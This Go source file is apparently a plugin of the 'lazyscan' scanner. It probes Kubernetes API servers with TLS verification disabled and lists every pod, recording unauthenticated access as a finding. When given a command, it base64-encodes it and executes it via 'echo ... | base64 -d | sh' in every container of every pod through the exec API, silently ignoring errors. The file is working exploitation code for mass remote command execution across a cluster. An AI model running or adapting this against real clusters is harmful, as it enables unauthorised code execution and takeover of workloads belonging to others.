package plugins

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"log"
	"strings"
	"time"

	"github.com/404tk/lazyscan/common"

	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/kubernetes/scheme"
	"k8s.io/client-go/rest"
	"k8s.io/client-go/tools/remotecommand"
)

type KubeAPIConfig struct {
	Command   string
	Clientset *kubernetes.Clientset
	Config    *rest.Config
}

func KubeAPIServerScan(info *common.HostInfo) (bool, error) {
	config := getConfig(info.Host, info.Port, info.Token)

	// create the clientset
	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return false, err
	}
	// list pods
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(info.Timeout)*time.Second)
	defer cancel()
	pods, err := clientset.CoreV1().Pods("").List(ctx, metav1.ListOptions{})
	if err != nil {
		return false, err
	}
	result := fmt.Sprintf("[%s:%s] There are %d pods in the cluster.", info.Host, info.Port, len(pods.Items))
	log.Println(result)
	if info.Queue != nil {
		vuln := common.Vuln{
			Host: info.Host,
			Port: info.Port,
		}
		if info.Token == "" {
			vuln.Unauth = true
		} else {
			vuln.Token = info.Token
		}
		info.Queue.Push(vuln)
	}

	// batch command execution
	cmd := info.Command.TCPCommand
	if cmd != "" {
		b64 := base64.StdEncoding.EncodeToString([]byte(cmd))

		var kubeconf = &KubeAPIConfig{
			Command:   fmt.Sprintf("echo %s | base64 -d | sh", b64),
			Clientset: clientset,
			Config:    config,
		}
		for _, p := range pods.Items {
			for _, c := range p.Spec.Containers {
				// 批量pods执行时忽略报错
				kubeconf.kubeAPIExec(p.Name, p.Namespace, c.Name)
			}
		}
	}
	return true, err
}

func (conf *KubeAPIConfig) kubeAPIExec(podName, namespace, container string) {
	req := conf.Clientset.CoreV1().RESTClient().Post().
		Resource("pods").
		Name(podName).
		Namespace(namespace).
		SubResource("exec").
		Param("container", container).
		VersionedParams(&v1.PodExecOptions{
			Command: []string{"/bin/sh", "-c", conf.Command},
			Stdin:   true,
			Stdout:  true,
			Stderr:  true,
			TTY:     false,
		}, scheme.ParameterCodec)
	executor, err := remotecommand.NewSPDYExecutor(conf.Config, "POST", req.URL())
	if err != nil {
		return
	}
	// 使用bytes.Buffer变量接收标准输出和标准错误
	var stdout, stderr bytes.Buffer
	executor.Stream(remotecommand.StreamOptions{
		Stdin:  strings.NewReader(""),
		Stdout: &stdout,
		Stderr: &stderr,
	})
}

func getConfig(ip, port, token string) *rest.Config {
	return &rest.Config{
		Host:            fmt.Sprintf("https://%s:%s/", ip, port),
		BearerToken:     token,
		BearerTokenFile: "",
		TLSClientConfig: rest.TLSClientConfig{
			Insecure: true, // 设置为true时 不需要CA
			// CAData: []byte(ca_crt),
		},
	}
}
